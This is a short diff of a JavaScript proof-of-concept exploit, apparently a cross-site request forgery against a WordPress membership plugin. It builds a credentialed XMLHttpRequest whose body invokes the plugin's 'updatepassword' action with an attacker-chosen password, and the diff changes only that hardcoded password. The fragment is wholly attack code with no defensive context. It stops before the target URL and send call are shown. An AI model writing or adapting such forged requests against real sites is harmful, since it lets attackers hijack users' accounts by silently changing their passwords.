@@ -5,7 +5,7 @@ function submitRequest() {
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.withCredentials = true;
 
-    var body = "plugin=mepr&action=updatepassword&mepr-new-password=KarnelPass1%40&mepr-confirm-password=KarnelPass1%40";
+    var body = "plugin=mepr&action=updatepassword&mepr-new-password=KarnelPass1R%40&mepr-confirm-password=KarnelPass1R%40";
     var aBody = new Uint8Array(body.length);
 
     for (var i = 0; i < aBody.length; i++) {
